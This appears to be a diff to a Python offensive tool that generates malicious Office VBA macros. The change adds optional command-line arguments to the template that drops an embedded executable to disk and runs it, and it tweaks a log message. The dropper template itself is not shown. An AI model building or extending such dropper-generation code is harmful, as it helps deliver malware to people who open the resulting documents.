@@ -13,7 +13,7 @@ import vbLib.ExecuteCMDAsync
 import vbLib.ExecuteCMDSync
 import vbLib.templates
 import vbLib.WmiExec
-from common.utils import MSTypes
+from common.utils import MSTypes, MPParam, getParamValue
 from collections import OrderedDict
 from common import  utils
 
@@ -138,6 +138,8 @@ class TemplateToVba(MpModule):
     
     def _processEmbedExeTemplate(self):
         """ Drop and execute embedded file """
+        paramArray = [MPParam("Command line parameters",optional=True)]  
+        self.fillInputParams2(paramArray)
         # generate random file name
         fileName = utils.randomAlpha(7)  + os.path.splitext(self.mpSession.embeddedFilePath)[1]
        
@@ -149,6 +151,10 @@ class TemplateToVba(MpModule):
         self.addVBLib(vbLib.ExecuteCMDAsync )
         content = vbLib.templates.EMBED_EXE
         content = content.replace("<<<FILE_NAME>>>", fileName)
+        if getParamValue(paramArray, "Command line parameters") != "":
+            content = content.replace("<<<PARAMETERS>>>"," & \" %s\"" % getParamValue(paramArray, "Command line parameters"))
+        else:
+            content = content.replace("<<<PARAMETERS>>>","")
         vbaFile = self.addVBAModule(content)
         
         logging.debug("   [-] Template %s VBA generated in %s" % (self.template, vbaFile)) 
@@ -336,7 +342,7 @@ class TemplateToVba(MpModule):
                 content = f.read()
                 f.close()
             else:
-                logging.info("   [!] Template %s is not recognized as file or default template." % self.template)
+                logging.info("   [!] Template %s is not recognized as file or default template. Payload will not work." % self.template)
                 return
          
 
